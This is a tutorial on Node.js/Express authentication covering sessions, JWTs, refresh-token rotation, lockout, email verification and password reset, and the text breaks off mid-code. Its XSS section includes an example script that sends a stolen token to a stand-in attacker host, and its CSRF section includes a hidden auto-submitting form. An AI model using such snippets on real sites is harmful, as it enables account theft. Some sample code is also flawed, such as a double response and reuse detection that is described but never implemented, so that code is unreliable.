## 🧱 PHASE 1 — Core Foundation (Session-Based Authentication)

**Goal:** Build a complete session-based authentication system from scratch.

### Step 1: Prerequisites — Concepts That Must Be Crystal Clear

Before writing a single line of auth code, you **must** deeply understand these concepts. If any of them are fuzzy, the code won't make intuitive sense.

#### Hashing vs Encryption

These are **NOT** the same thing. This confusion causes real security vulnerabilities.

| Aspect          | Hashing                                    | Encryption                                  |
| --------------- | ------------------------------------------ | ------------------------------------------- |
| **Direction**   | One-way (irreversible)                     | Two-way (reversible)                        |
| **Purpose**     | Verify data integrity                      | Protect data confidentiality                |
| **Can you get original back?** | ❌ No               | ✅ Yes, with the key                        |
| **Use case**    | Storing passwords                          | Storing credit cards, sending messages      |
| **Example**     | bcrypt, SHA-256, argon2                    | AES, RSA                                    |

```
Hashing:     "mypassword" → bcrypt → "$2b$10$N9qo8uLO..." (CANNOT reverse this)
Encryption:  "mypassword" → AES(key) → "x8f2k9..." → AES(key) → "mypassword" (CAN reverse)
```

> **Rule:** Passwords are ALWAYS **hashed**, never encrypted. If you can decrypt your users' passwords, your system is insecure.

#### Cookies vs LocalStorage

| Aspect              | Cookies                                      | LocalStorage                              |
| ------------------- | -------------------------------------------- | ----------------------------------------- |
| **Sent with requests** | ✅ Automatically with every request       | ❌ Must be manually attached via JS       |
| **Accessible by JS** | ❌ Not if `HttpOnly` is set                 | ✅ Always accessible by any JS            |
| **Size limit**      | ~4KB                                         | ~5-10MB                                   |
| **Expiry**          | Configurable (server-controlled)             | No expiry (persists until cleared)        |
| **XSS vulnerable?** | ❌ Protected with `HttpOnly`                | ✅ Any XSS script can steal it            |
| **Best for**        | Auth tokens (secure)                         | Non-sensitive user preferences            |

> **Rule for auth:** NEVER store authentication tokens in LocalStorage. Always use HttpOnly cookies.

#### What is a Token vs What is a Session?

```
Token (JWT):
- Self-contained string with user info + signature
- Lives on the CLIENT side
- Server doesn't store anything
- Verified using a secret key (no DB lookup)

Session:
- Server-generated unique ID (random string)
- Lives on the SERVER side (Redis/DB)
- Client only holds the session ID (in a cookie)
- Verified by looking up the session store
```

#### HTTP Headers in Authentication

```http
# Request from client → server
GET /api/profile HTTP/1.1
Host: api.example.com
Cookie: sessionId=abc123                    ← Session-based auth
Authorization: Bearer eyJhbGciOi...        ← JWT-based auth
X-API-Key: sk-abc123xyz789                 ← API key auth

# Response from server → client
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict   ← Server sets cookie
```

### Step 2: Build Password-Based Authentication (Session System)

This is the **full implementation** of a session-based auth system using Node.js/Express.

#### 2.1 User Registration with Password Hashing

```javascript
const bcrypt = require('bcrypt');
const User = require('./models/User');

// POST /api/auth/register
async function register(req, res) {
  const { email, password, name } = req.body;

  // 1. Check if user already exists
  const existingUser = await User.findOne({ email });
  if (existingUser) {
    return res.status(409).json({ error: "Registration failed" }); // Generic!
  }

  // 2. Hash the password (NEVER store plain text)
  const saltRounds = 10;  // Cost factor — higher = slower but more secure
  const hashedPassword = await bcrypt.hash(password, saltRounds);

  // 3. Store user with hashed password
  const user = await User.create({
    email,
    name,
    password: hashedPassword,  // ← This is the HASH, not the actual password
    role: 'user'               // Default role
  });

  res.status(201).json({ message: "User registered successfully" });
}
```

**What `bcrypt.hash` does internally:**

```
"mypassword123"
       ↓
  Generate random salt: "$2b$10$N9qo8uLOickgx2ZMRZoMye"
       ↓
  Combine password + salt → hash
       ↓
  Result: "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
           ├── algorithm ──┤├── salt ──────────────────┤├── hash ──────────────┤
```

**Why salt?** Without salt, two users with the same password would have the same hash. Attackers could use **rainbow tables** (precomputed hash dictionaries) to crack passwords instantly. Salt makes each hash unique.

#### 2.2 Login with Session Creation

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const redis = require('redis');

// Configure session middleware (in app.js)
const redisClient = redis.createClient();
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,    // Signs the session cookie
  resave: false,                          // Don't save if not modified
  saveUninitialized: false,               // Don't create empty sessions
  cookie: {
    httpOnly: true,    // JS can't access it (XSS protection)
    secure: true,      // Only sent over HTTPS
    sameSite: 'strict', // CSRF protection
    maxAge: 15 * 60 * 1000  // 15 minutes
  }
}));

// POST /api/auth/login
async function login(req, res) {
  const { email, password } = req.body;

  // 1. Find user
  const user = await User.findOne({ email });

  // 2. Timing-safe: always hash even if user not found
  if (!user) {
    await bcrypt.hash("dummy", 10);  // Fake hash to equalize timing
    return res.status(401).json({ error: "Authentication failed" });
  }

  // 3. Compare provided password with stored hash
  const isValid = await bcrypt.compare(password, user.password);
  if (!isValid) {
    return res.status(401).json({ error: "Authentication failed" });
  }

  // 4. Create session — express-session handles this automatically
  req.session.userId = user._id;
  req.session.role = user.role;

  res.json({ message: "Login successful" });
  // The session ID cookie is automatically set by express-session!
}
```

**What happens behind the scenes:**

```
1. bcrypt.compare("mypassword123", "$2b$10$N9qo8u...") → true ✅
2. express-session generates a unique session ID: "s:abc123.signature"
3. Stores in Redis: { "sess:abc123": { userId: "507f1f", role: "user" } }
4. Sets cookie: Set-Cookie: connect.sid=s:abc123.signature; HttpOnly; Secure
5. Browser stores the cookie and sends it with every future request
```

#### 2.3 Protecting Routes with Session Check

```javascript
// Middleware: Check if user is authenticated
function requireAuth(req, res, next) {
  if (!req.session || !req.session.userId) {
    return res.status(401).json({ error: "Not authenticated" });
  }
  next();  // User is authenticated, proceed to route handler
}

// Protected route
app.get('/api/profile', requireAuth, async (req, res) => {
  const user = await User.findById(req.session.userId);
  res.json({ name: user.name, email: user.email, role: user.role });
});
```

#### 2.4 Logout (Session Destruction)

```javascript
// POST /api/auth/logout
function logout(req, res) {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: "Logout failed" });
    }
    res.clearCookie('connect.sid');  // Remove cookie from browser
    res.json({ message: "Logged out successfully" });
  });
}
```

> **Why logout is easy in session-based systems:** You simply **delete the session from Redis**. The next time the client sends the session ID cookie, the server looks it up, finds nothing, and rejects the request. Done. Compare this to JWT where you can't invalidate a token without a blacklist.

#### Key Understandings from Session Auth

| Question | Answer |
| --- | --- |
| **Why is session ID not the password?** | Session ID is a random string that maps to user data. It reveals nothing about the user. Even if intercepted, it expires quickly and can be revoked. |
| **Why is session stored server-side?** | Because the server owns the truth. Client can't tamper with server-side data. In JWT, the data is on the client — vulnerable to theft. |
| **Why is logout easy?** | Just delete the session from Redis. Session ID cookie becomes meaningless. No complex blacklist needed. |

```javascript
const rateLimit = require('express-rate-limit');
```

## 🧠 PHASE 2 — JWT-Based Authentication (Modern Backend)

**Goal:** Build a stateless authentication system and understand middleware architecture.

### Step 4: Implement JWT Login System

#### 4.1 Registration (Same as Before)

Password hashing stays the same — bcrypt doesn't change regardless of session vs JWT.

#### 4.2 Login with JWT Generation

```javascript
const jwt = require('jsonwebtoken');

// POST /api/auth/login
async function login(req, res) {
  const { email, password } = req.body;

  const user = await User.findOne({ email });
  if (!user) {
    await bcrypt.hash("dummy", 10);
    return res.status(401).json({ error: "Authentication failed" });
  }

  const isValid = await bcrypt.compare(password, user.password);
  if (!isValid) {
    return res.status(401).json({ error: "Authentication failed" });
  }

  // Generate JWT — this is the KEY difference from session-based auth
  const token = jwt.sign(
    {
      sub: user._id,        // Subject (user ID)
      role: user.role,       // User's role
      name: user.name        // User's name
    },
    process.env.JWT_SECRET,  // Secret key (NEVER expose this)
    { expiresIn: '15m' }     // Token expires in 15 minutes
  );

  // Option A: Send in response body (client stores it)
  res.json({ token });

  // Option B (Better): Send in HttpOnly cookie
  res.cookie('token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000
  });
  res.json({ message: "Login successful" });
}
```

**What's inside the generated JWT:**

```json
// Header (automatically generated)
{ "alg": "HS256", "typ": "JWT" }

// Payload (what you specified)
{
  "sub": "507f1f77bcf86cd799439011",
  "role": "user",
  "name": "John Doe",
  "iat": 1709020800,        // Issued at (auto-added)
  "exp": 1709021700          // Expires at (auto-added: iat + 15min)
}

// Signature (automatically computed)
HMACSHA256(header + "." + payload, "your-secret-key")
```

> **Critical:** The password is NEVER stored in the JWT. The JWT contains only the user's **ID**, **role**, and **metadata**. The password stays hashed in the database.

#### What is the Secret Key?

```
The secret key is like the master password for your entire auth system.

- It's used to SIGN tokens (when creating them)
- It's used to VERIFY tokens (when checking them)
- If someone gets your secret key, they can forge any JWT they want
- It should be a long, random string stored in environment variables

Example (in .env file):
JWT_SECRET=a7f3b2e1d4c5f6a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1

NEVER:
- Hardcode it in source code
- Commit it to Git
- Use short/predictable strings like "secret" or "password"
```

### Step 5: Route Protection with Auth Middleware

This is where you start **thinking like a backend engineer** — designing clean, reusable middleware.

#### 5.1 The Auth Middleware

```javascript
const jwt = require('jsonwebtoken');

function authMiddleware(req, res, next) {
  // 1. Extract token from Authorization header
  const authHeader = req.headers.authorization;
  // Format: "Bearer eyJhbGciOi..."

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: "No token provided" });
  }

  const token = authHeader.split(' ')[1];
  // "Bearer eyJhbG..." → ["Bearer", "eyJhbG..."] → "eyJhbG..."

  try {
    // 2. Verify token with secret key
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    // If verification fails, jwt.verify throws an error

    // 3. Attach user info to the request object
    req.user = {
      id: decoded.sub,
      role: decoded.role,
      name: decoded.name
    };
    // Now ANY route handler after this middleware can access req.user

    // 4. Pass control to the next middleware/route handler
    next();

  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: "Token expired" });
    }
    return res.status(401).json({ error: "Invalid token" });
  }
}
```

#### 5.2 Using the Middleware

```javascript
// Public routes — no middleware needed
app.post('/api/auth/login', login);
app.post('/api/auth/register', register);

// Protected routes — requireAuth middleware
app.get('/api/profile', authMiddleware, (req, res) => {
  // req.user is available here because authMiddleware set it!
  res.json({
    id: req.user.id,
    name: req.user.name,
    role: req.user.role
  });
});

app.get('/api/notes', authMiddleware, async (req, res) => {
  const notes = await Note.find({ userId: req.user.id });
  res.json(notes);
});
```

**The Middleware Flow:**

```
Client Request → authMiddleware → Route Handler → Response
                      ↓
              Extract token from header
              Verify with secret key
              Decode user data
              Attach to req.user
              Call next()
                      ↓
              Route Handler sees req.user ✅
```

### Step 6: Role-Based Authorization (RBAC) with Middleware

Authentication answers: "Who are you?"
Authorization answers: "Are you allowed to do this?"

#### 6.1 User Model with Role

```javascript
// models/User.js
const userSchema = new mongoose.Schema({
  email:    { type: String, required: true, unique: true },
  password: { type: String, required: true },
  name:     { type: String, required: true },
  role:     { 
    type: String, 
    enum: ['user', 'admin', 'moderator'],
    default: 'user'
  }
});
```

#### 6.2 Authorization Middleware (Role Check)

```javascript
// Generic: accepts any roles
function authorize(...allowedRoles) {
  return (req, res, next) => {
    // req.user was set by authMiddleware (runs BEFORE this)
    if (!req.user) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: "Forbidden — insufficient permissions" });
      // 401 = Who are you? (not authenticated)
      // 403 = I know who you are, but you can't do this (not authorized)
    }

    next();
  };
}
```

#### 6.3 Middleware Chaining — Auth First, Then Authorization

```javascript
// Anyone authenticated can access:
app.get('/api/notes', authMiddleware, getMyNotes);

// Only admins can access:
app.get('/api/admin/users', authMiddleware, authorize('admin'), getAllUsers);
app.delete('/api/admin/users/:id', authMiddleware, authorize('admin'), deleteUser);

// Admins AND moderators can access:
app.get('/api/reports', authMiddleware, authorize('admin', 'moderator'), getReports);

// Only admins can access dead zone:
app.get('/api/dead-zone', authMiddleware, authorize('admin'), getDeadZoneNotes);
```

**The Middleware Chain:**

```
Request → authMiddleware → authorize('admin') → Route Handler
               ↓                   ↓
         "Who are you?"     "Are you admin?"
         Sets req.user       Checks req.user.role
         Calls next()        Calls next() if admin
                              403 if not admin
```

> **Key insight:** Authentication ALWAYS comes first. You can't check permissions if you don't know who the user is. This is why `authMiddleware` always runs before `authorize()`.

## 🔄 PHASE 3 — Refresh Tokens (Production-Level)

**Goal:** Build a real-world token system that handles expiration, rotation, and security properly.

### The Problem: Access Tokens Expire

In Phase 2, we set `expiresIn: '15m'` on our JWT. After 15 minutes, the user gets a `401 Token Expired` error. Do they have to log in again every 15 minutes?

In real apps — **no**. That would be a terrible user experience. Netflix doesn't make you log in every 15 minutes. Gmail doesn't either.

The solution is **refresh tokens**.

### Step 7: Complete Refresh Token System

#### How the Dual-Token System Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    TOKEN PAIR SYSTEM                              │
├────────────────────────┬────────────────────────────────────────┤
│   Access Token         │   Refresh Token                        │
├────────────────────────┼────────────────────────────────────────┤
│ Short-lived (15 min)   │ Long-lived (7 days)                    │
│ Sent with every request│ Sent ONLY to /refresh endpoint         │
│ Stored in memory (JS)  │ Stored in HttpOnly cookie              │
│ Contains user data     │ Contains only user ID + token ID       │
│ Stateless verification │ Stored & verified in database/Redis    │
│ If stolen: damage is   │ If stolen: can be revoked from DB      │
│ limited to 15 min      │                                        │
└────────────────────────┴────────────────────────────────────────┘
```

**The Complete Flow:**

```
LOGIN:
Client → POST /login (email, password) → Server
Server → Validates → Creates BOTH tokens:
  1. Access Token (JWT, 15 min) → sent in response body
  2. Refresh Token (random string, 7 days) → stored in DB + sent as HttpOnly cookie

NORMAL API CALLS:
Client → GET /api/notes (Authorization: Bearer <access_token>) → Server
Server → Verifies access token → Returns data

WHEN ACCESS TOKEN EXPIRES:
Client → GET /api/notes → Server → 401 Token Expired

Client → POST /auth/refresh (cookie has refresh token) → Server
Server → Validates refresh token against DB
       → Issues NEW access token (15 min)
       → Issues NEW refresh token (rotation)
       → Revokes old refresh token
Client → Uses new access token for subsequent requests

LOGOUT:
Client → POST /logout → Server
Server → Deletes refresh token from DB
       → Clears refresh token cookie
```

#### 7.1 Login — Issue Both Tokens

```javascript
const crypto = require('crypto');

async function login(req, res) {
  // ... validate email/password (same as before) ...

  // 1. Generate short-lived access token (JWT)
  const accessToken = jwt.sign(
    { sub: user._id, role: user.role, name: user.name },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );

  // 2. Generate long-lived refresh token (random string, NOT a JWT)
  const refreshToken = crypto.randomBytes(64).toString('hex');
  //    → "a3f8b2c1e4d5...128 characters...9f0a1b2c"

  // 3. Store refresh token in database (this is STATEFUL for refresh tokens)
  await RefreshToken.create({
    token: refreshToken,
    userId: user._id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
    createdAt: new Date()
  });

  // 4. Send access token in response body
  //    Send refresh token in HttpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,       // JS can't read it
    secure: true,          // HTTPS only
    sameSite: 'strict',    // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
    path: '/api/auth'      // Only sent to auth endpoints, not every request
  });

  res.json({ accessToken });
}
```

#### 7.2 Refresh Endpoint — Rotate Tokens

```javascript
// POST /api/auth/refresh
async function refreshAccessToken(req, res) {
  const { refreshToken } = req.cookies;

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token" });
  }

  // 1. Find the refresh token in database
  const storedToken = await RefreshToken.findOne({ token: refreshToken });

  if (!storedToken) {
    // Token not in DB — possible token theft! (reuse detection)
    // If a token was already rotated but someone tries using the OLD one,
    // it means the old token was stolen. Invalidate ALL tokens for this user.
    return res.status(401).json({ error: "Invalid refresh token" });
  }

  // 2. Check expiry
  if (storedToken.expiresAt < new Date()) {
    await RefreshToken.deleteOne({ _id: storedToken._id });
    return res.status(401).json({ error: "Refresh token expired" });
  }

  // 3. Find associated user
  const user = await User.findById(storedToken.userId);
  if (!user) {
    return res.status(401).json({ error: "User not found" });
  }

  // 4. DELETE the old refresh token (one-time use)
  await RefreshToken.deleteOne({ _id: storedToken._id });

  // 5. Generate NEW access token
  const newAccessToken = jwt.sign(
    { sub: user._id, role: user.role, name: user.name },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );

  // 6. Generate NEW refresh token (ROTATION)
  const newRefreshToken = crypto.randomBytes(64).toString('hex');
  await RefreshToken.create({
    token: newRefreshToken,
    userId: user._id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });

  // 7. Set new refresh token cookie
  res.cookie('refreshToken', newRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
    path: '/api/auth'
  });

  res.json({ accessToken: newAccessToken });
}
```

#### Why Refresh Token Rotation?

```
WITHOUT rotation (dangerous):
  Refresh token: "abc123" → used 100 times over 7 days
  If stolen on day 1, attacker has access for 7 days

WITH rotation (secure):
  Login:    Refresh token "abc" → Access token issued
  Refresh:  "abc" deleted → New "def" issued → New access token
  Refresh:  "def" deleted → New "ghi" issued → New access token
  
  If attacker steals "abc" and tries to use it after rotation:
  → "abc" not in DB → REUSE DETECTED → Invalidate all tokens
  → Legitimate user must re-login (minor inconvenience vs security breach)
```

#### 7.3 Logout — Properly Destroy Tokens

```javascript
async function logout(req, res) {
  const { refreshToken } = req.cookies;
  
  // Delete from database
  if (refreshToken) {
    await RefreshToken.deleteOne({ token: refreshToken });
  }

  // Clear cookie
  res.clearCookie('refreshToken', { path: '/api/auth' });

  res.json({ message: "Logged out successfully" });
}
```

#### Key Understandings for Refresh Tokens

| Question | Answer |
| --- | --- |
| **Why are access tokens short-lived?** | If stolen, damage is limited to 15 minutes. After that, the token is useless. |
| **Why are refresh tokens long-lived?** | So users don't have to log in every 15 minutes. They provide convenience while being stored securely. |
| **Why store refresh tokens in DB/Redis?** | So the server can revoke them. Unlike access tokens (stateless), refresh tokens must be revocable (stateful). |
| **Why rotate refresh tokens?** | If an old token is reused after rotation, the server knows it was stolen. This is called **reuse detection**. |
| **Why not just make access tokens long-lived?** | Because access tokens are sent with every request (higher exposure). Short-lived = smaller attack window. |

### Step 8: Token Storage Best Practices & Attack Vectors

This is the **most critical** section for production security. Understanding XSS and CSRF attacks is non-negotiable.

#### Token Storage Rules

```
┌─────────────────────────────────────────────────────────────┐
│                 WHERE TO STORE TOKENS                         │
├───────────────────────┬─────────────────────────────────────┤
│ Access Token          │ In-memory JavaScript variable        │
│                       │ (NOT localStorage, NOT sessionStorage)│
├───────────────────────┼─────────────────────────────────────┤
│ Refresh Token         │ HttpOnly Secure cookie               │
│                       │ (server sets it, JS can never read it)│
├───────────────────────┼─────────────────────────────────────┤
│ ❌ NEVER store in     │ localStorage (XSS vulnerable)        │
│                       │ sessionStorage (XSS vulnerable)      │
│                       │ Non-HttpOnly cookies (JS accessible) │
│                       │ URL parameters (visible in logs)     │
└───────────────────────┴─────────────────────────────────────┘
```

#### XSS Attacks (Cross-Site Scripting)

**What is XSS?** An attacker injects malicious JavaScript into your website that runs in other users' browsers.

**How it relates to auth:**

```javascript
// Imagine your site has a comment section with no input sanitization.
// An attacker posts this "comment":

<script>
  // This runs in EVERY user's browser who views this page!
  const token = localStorage.getItem('authToken');
  // ↑ If you stored JWT in localStorage, the attacker now has it

  fetch('https://attacker-server.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
    // ↑ Sends YOUR token to the attacker's server
  });
</script>

// Now the attacker can impersonate any user who viewed that page.
```

**Why HttpOnly cookies are immune:**

```javascript
// With HttpOnly cookie, the attacker's script CAN'T do this:
document.cookie  // → Returns "" for HttpOnly cookies
// JavaScript literally cannot see or read HttpOnly cookies

// The cookie is sent by the browser automatically, but JS never touches it.
// The attacker's script has NO WAY to steal it.
```

**XSS Prevention Checklist:**
- ✅ Use HttpOnly cookies for auth tokens
- ✅ Sanitize all user input (escape HTML characters)
- ✅ Use Content Security Policy (CSP) headers
- ✅ Never use `innerHTML` with user-provided data
- ✅ Use templating engines that auto-escape output

#### CSRF Attacks (Cross-Site Request Forgery)

**What is CSRF?** An attacker tricks a logged-in user's browser into making unwanted requests to your server.

**How it works:**

```
1. User is logged into bank.com (has session cookie)
2. User visits evil-site.com (in another tab)
3. evil-site.com has hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker" />
     <input type="hidden" name="amount" value="10000" />
   </form>
   <script>document.forms[0].submit();</script>

4. Browser sends the POST request TO bank.com
   WITH the user's session cookie (auto-attached!)
5. bank.com thinks it's the user → transfers $10,000
```

**CSRF Prevention:**

```javascript
// 1. SameSite cookie attribute (most effective)
res.cookie('token', jwt, {
  sameSite: 'strict'   // Cookie ONLY sent for same-site requests
  // evil-site.com → bank.com = cross-site → cookie NOT sent ✅
});

// 2. CSRF token (double-submit pattern)
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// Server generates a unique CSRF token per session
// Client must include it in every state-changing request
// Attacker's page can't read the CSRF token (same-origin policy)

// 3. Check Origin/Referer headers
function csrfCheck(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  if (!origin || !origin.startsWith('https://your-domain.com')) {
    return res.status(403).json({ error: "CSRF detected" });
  }
  next();
}
```

#### XSS vs CSRF — The Comparison

| Aspect       | XSS                                       | CSRF                                        |
| ------------ | ----------------------------------------- | ------------------------------------------- |
| **What**     | Inject malicious script into your site    | Trick browser into making unwanted requests |
| **Target**   | Steal data (tokens, cookies, user input)  | Perform actions as the user                 |
| **Defense**  | Input sanitization, HttpOnly, CSP         | SameSite cookies, CSRF tokens               |
| **Exploits** | Trust a site has in user input            | Trust a server has in the browser           |

## 🛡 PHASE 4 — Production-Level Security

### Step 9: Account Protection — Login Attempt Tracking & Lockout

#### Why This Matters

Without account locking, an attacker can run a brute-force script that tries thousands of passwords per minute against a single account. Rate limiting slows them down, but account locking **stops them entirely** after a threshold.

#### 9.1 User Model with Lock Fields

```javascript
const userSchema = new mongoose.Schema({
  email:            { type: String, required: true, unique: true },
  password:         { type: String, required: true },
  name:             { type: String, required: true },
  role:             { type: String, enum: ['user', 'admin', 'moderator'], default: 'user' },
  
  // Account protection fields
  failedLoginAttempts: { type: Number, default: 0 },
  lockUntil:           { type: Date, default: null },
  lastFailedLogin:     { type: Date, default: null }
});

// Virtual property: is the account currently locked?
userSchema.virtual('isLocked').get(function () {
  return this.lockUntil && this.lockUntil > new Date();
});
```

#### 9.2 Login with Account Lock Logic

```javascript
const MAX_ATTEMPTS = 5;
const LOCK_DURATION = 30 * 60 * 1000; // 30 minutes in milliseconds

async function login(req, res) {
  const { email, password } = req.body;

  const user = await User.findOne({ email });

  // Timing-safe: always hash even if user not found
  if (!user) {
    await bcrypt.hash("dummy", 10);
    return res.status(401).json({ error: "Authentication failed" });
  }

  // 1. Check if account is locked
  if (user.isLocked) {
    const minutesLeft = Math.ceil((user.lockUntil - new Date()) / 60000);
    return res.status(423).json({ 
      error: "Account temporarily locked. Try again later."
      // Don't tell them exactly when — that's info for attackers
    });
  }

  // 2. Verify password
  const isValid = await bcrypt.compare(password, user.password);

  if (!isValid) {
    // 3. Increment failed attempts
    const updates = {
      $inc: { failedLoginAttempts: 1 },
      $set: { lastFailedLogin: new Date() }
    };

    // 4. Lock account if threshold reached
    if (user.failedLoginAttempts + 1 >= MAX_ATTEMPTS) {
      updates.$set.lockUntil = new Date(Date.now() + LOCK_DURATION);
      updates.$set.failedLoginAttempts = 0; // Reset counter after lock
    }

    await User.updateOne({ _id: user._id }, updates);
    return res.status(401).json({ error: "Authentication failed" });
  }

  // 5. Successful login — reset fail counter
  if (user.failedLoginAttempts > 0 || user.lockUntil) {
    await User.updateOne({ _id: user._id }, {
      $set: { failedLoginAttempts: 0, lockUntil: null }
    });
  }

  // 6. Generate token / create session (as before)
  const token = jwt.sign(
    { sub: user._id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );

  res.json({ accessToken: token });
}
```

**The Flow Visualized:**

```
Attempt 1: Wrong password → failedLoginAttempts: 1 → "Authentication failed"
Attempt 2: Wrong password → failedLoginAttempts: 2 → "Authentication failed"
Attempt 3: Wrong password → failedLoginAttempts: 3 → "Authentication failed"
Attempt 4: Wrong password → failedLoginAttempts: 4 → "Authentication failed"
Attempt 5: Wrong password → LOCK ACCOUNT for 30 min → "Account temporarily locked"

... 30 minutes pass ...

Attempt 6: Correct password → Reset counter → Login successful ✅
```

#### Understanding Brute Force vs Dictionary Attacks

| Attack Type       | Method                                                  | Example                                    |
| ----------------- | ------------------------------------------------------- | ------------------------------------------ |
| **Brute Force**   | Try EVERY possible combination systematically           | `a`, `b`, ..., `aa`, `ab`, ..., `aaa`...   |
| **Dictionary**    | Try common passwords from a pre-built list              | `password`, `123456`, `qwerty`, `letmein`  |
| **Credential Stuffing** | Use leaked email/password pairs from other breaches | Stolen from Site A, tried on Site B       |

Account locking defends against all three by making mass attempts impractical.

### Step 10: Email Verification Flow

#### Why Email Verification Matters

Without verification, anyone can register with a **fake email** (or someone else's email), leading to:

- Spam accounts flooding your platform
- Users who can never recover their accounts (wrong email)
- Potential impersonation (registering as someone@company.com)
- Inability to send password reset emails

> **Rule:** Never allow unverified accounts to access protected features. At minimum, require email verification before the user can post, comment, or perform sensitive actions.

#### 10.1 User Model with Verification Fields

#### 10.2 Registration — Generate & Send Verification Token

```javascript
const crypto = require('crypto');
const nodemailer = require('nodemailer');

async function register(req, res) {
  const { email, password, name } = req.body;

  // Check existing user
  const existingUser = await User.findOne({ email });
  if (existingUser) {
    return res.status(409).json({ error: "Registration failed" });
  }

  // Hash password
  const hashedPassword = await bcrypt.hash(password, 10);

  // Generate verification token
  const verificationToken = crypto.randomBytes(32).toString('hex');
  // → "a8f3b2c1e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0"

  // Hash the token before storing (same reason we hash passwords)
  const hashedToken = crypto
    .createHash('sha256')
    .update(verificationToken)
    .digest('hex');

  const user = await User.create({
    email,
    name,
    password: hashedPassword,
    isVerified: false,
    verificationToken: hashedToken,          // Store HASHED token
    verificationExpires: new Date(Date.now() + 24 * 60 * 60 * 1000) // 24 hours
  });

  // Build verification URL (send PLAIN token in URL, store HASH in DB)
  const verificationUrl = `${process.env.APP_URL}/api/auth/verify/${verificationToken}`;

  // Send verification email
  await sendEmail({
    to: email,
    subject: 'Verify Your Email',
    html: `
      <h1>Welcome, ${name}!</h1>
      <p>Click the link below to verify your email:</p>
      <a href="${verificationUrl}">Verify Email</a>
      <p>This link expires in 24 hours.</p>
    `
  });

  res.status(201).json({ 
    message: "Registration successful. Please check your email to verify your account." 
  });
}
```

#### 10.3 Email Verification Endpoint

```javascript
// GET /api/auth/verify/:token
async function verifyEmail(req, res) {
  // 1. Hash the token from the URL to match against DB
  const hashedToken = crypto
    .createHash('sha256')
    .update(req.params.token)
    .digest('hex');

  // 2. Find user with matching token that hasn't expired
  const user = await User.findOne({
    verificationToken: hashedToken,
    verificationExpires: { $gt: new Date() }  // Token must not be expired
  });

  if (!user) {
    return res.status(400).json({ error: "Invalid or expired verification link" });
  }

  // 3. Mark user as verified
  user.isVerified = true;
  user.verificationToken = null;     // Clean up — token is single-use
  user.verificationExpires = null;
  await user.save();

  res.json({ message: "Email verified successfully! You can now log in." });
}
```

#### Why Verification Tokens Must Expire

```
Without expiry:
  → Token sits in user's email forever
  → If email account is compromised months later, attacker can verify & access

With expiry (24 hours):
  → Token becomes useless after 24 hours
  → User can request a new one if they missed it
  → Attack window is minimal
```

#### Why Hash Verification Tokens Before Storing

```
Plain token in DB:                    Hashed token in DB:
┌────────────────────┐               ┌────────────────────┐
│ DB: "a8f3b2c1..."  │               │ DB: "7f2d9a..."    │
└────────────────────┘               └────────────────────┘
If DB is leaked:                      If DB is leaked:
→ Attacker has the token              → Attacker has a HASH
→ Can verify any account              → Can't reconstruct the URL
→ Full account takeover               → Token is useless to them
```

> Same principle as passwords — **never store secrets in plain text**, whether it's passwords, verification tokens, or reset tokens.

### Step 11: Forgot Password / Password Reset Flow

This is one of the most security-sensitive flows in any application. Get it wrong, and attackers can take over any account.

#### 11.1 Request Password Reset

```javascript
// POST /api/auth/forgot-password
async function forgotPassword(req, res) {
  const { email } = req.body;

  const user = await User.findOne({ email });

  // ALWAYS return same response — don't reveal if email exists
  const genericMessage = "If an account with that email exists, a reset link has been sent.";

  if (!user) {
    return res.json({ message: genericMessage });
    // No error! Same response whether email exists or not
  }

  // 1. Generate reset token
  const resetToken = crypto.randomBytes(32).toString('hex');

  // 2. Hash before storing
  const hashedToken = crypto
    .createHash('sha256')
    .update(resetToken)
    .digest('hex');

  // 3. Store hashed token with short expiry
  user.resetPasswordToken = hashedToken;
  user.resetPasswordExpires = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes only!
  await user.save();

  // 4. Send email with PLAIN token
  const resetUrl = `${process.env.APP_URL}/reset-password/${resetToken}`;

  await sendEmail({
    to: email,
    subject: 'Password Reset Request',
    html: `
      <h1>Password Reset</h1>
      <p>You requested a password reset. Click below:</p>
      <a href="${resetUrl}">Reset Password</a>
      <p>This link expires in 10 minutes.</p>
      <p>If you didn't request this, ignore this email.</p>
    `
  });

  res.json({ message: genericMessage });
}
```

> **Critical:** The response is identical whether the email exists or not. This prevents **email enumeration attacks** — where attackers discover which emails are registered on your platform.

#### 11.2 Reset Password Endpoint

```javascript
// POST /api/auth/reset-password/:token
async function resetPassword(req, res) {
  const { password } = req.body;

  // 1. Hash the URL token to find it in DB
  const hashedToken = crypto
    .createHash('sha256')
    .update(req.params.token)
    .digest('hex');

  // 2. Find user with valid, non-expired reset token
  const user = await User.findOne({
    resetPasswordToken: hashedToken,
